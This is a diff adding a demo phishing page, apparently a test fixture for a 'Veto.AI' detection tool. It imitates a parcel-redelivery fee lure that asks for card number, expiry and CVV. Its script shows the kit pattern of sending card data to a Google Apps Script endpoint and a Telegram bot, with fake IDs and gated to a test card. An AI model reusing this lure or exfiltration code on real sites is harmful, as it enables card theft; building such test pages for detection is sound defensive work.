@@ -1,0 +1,57 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Parcel Tracking, Delivery on hold</title>
+<style>
+  body { margin: 0; font-family: Arial, Helvetica, sans-serif; background: #f6f6f6; color: #222; }
+  header { background: #c8102e; color: #fff; padding: 14px 18px; font-weight: bold; }
+  main { max-width: 420px; margin: 16px auto; background: #fff; border-radius: 8px; padding: 18px; }
+  .status { display: flex; gap: 10px; align-items: center; background: #fdecea; padding: 10px; border-radius: 6px; font-size: 14px; }
+  .fee { font-size: 26px; font-weight: bold; margin: 14px 0 4px; }
+  label { display: block; font-size: 13px; margin: 10px 0 4px; color: #555; }
+  input { width: 100%; box-sizing: border-box; padding: 10px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; }
+  .row { display: flex; gap: 10px; } .row > div { flex: 1; }
+  button { margin-top: 16px; width: 100%; padding: 12px; border: 0; border-radius: 6px; background: #c8102e; color: #fff; font-size: 16px; }
+  footer { text-align: center; font-size: 11px; color: #999; margin: 18px; }
+</style>
+</head>
+<body>
+<header>📦 Parcel Tracking</header>
+<main>
+  <div class="status">⚠️ Your parcel is <b>on hold</b> because the delivery address is incomplete.</div>
+  <p>Pay the redelivery fee to schedule a new delivery within 24 hours. Unclaimed parcels are returned to the sender.</p>
+  <div class="fee">AED 5.89</div>
+  <form action="#">
+    <label for="card">Card number</label><input id="card" name="cardnumber" autocomplete="cc-number" maxlength="19">
+    <div class="row">
+      <div><label for="exp">Expiry</label><input id="exp" name="exp" autocomplete="cc-exp" placeholder="MM/YY"></div>
+      <div><label for="cvv">CVV</label><input id="cvv" name="cvv" autocomplete="cc-csc" maxlength="3"></div>
+    </div>
+    <button type="submit">Pay AED 5.89</button>
+    <p id="done" hidden>DEMO. Nothing you type here is sent anywhere.</p>
+  </form>
+</main>
+<footer>VETO.AI DEMO PAGE · test page for the X-ray chamber · it collects nothing</footer>
+<script>
+// How many parcel-fee kits collect cards: a hidden Google Apps Script spreadsheet (the ID below is fake).
+// DEMO SAFETY: only the public test card 4111 1111 1111 1111, the fake value the X-ray chamber types,
+// then blocks, is ever sent. Anything a person types goes nowhere.
+var SHEET = 'https://script.google.com/macros/s/AKfycbVETODEMOnotARealScriptId0000000000000/exec';
+// ...and pings the operator's Telegram bot about each new card: the SAME bot as the bank page (fake token).
+var BOT = 'https://api.telegram.org/bot7012345678:AAH-veto-demo-token-not-real-000000/sendMessage';
+// The same analytics ID on every page of this (demo) operation: a campaign key Veto uses to link sites. No Google script is loaded.
+window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('config', 'G-VT7DEMO2026');
+
+document.querySelector('form').addEventListener('submit', function (e) {
+  e.preventDefault();
+  if (/^4111/.test(document.getElementById('card').value.replace(/\D/g, ''))) {
+    navigator.sendBeacon(SHEET, new URLSearchParams(new FormData(document.querySelector('form'))));
+    fetch(BOT, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: '-1000000000000', text: 'new card ' + document.getElementById('card').value }) }).catch(function () {});
+  }
+  document.getElementById('done').hidden = false;
+});
+</script>
+</body>
+</html>
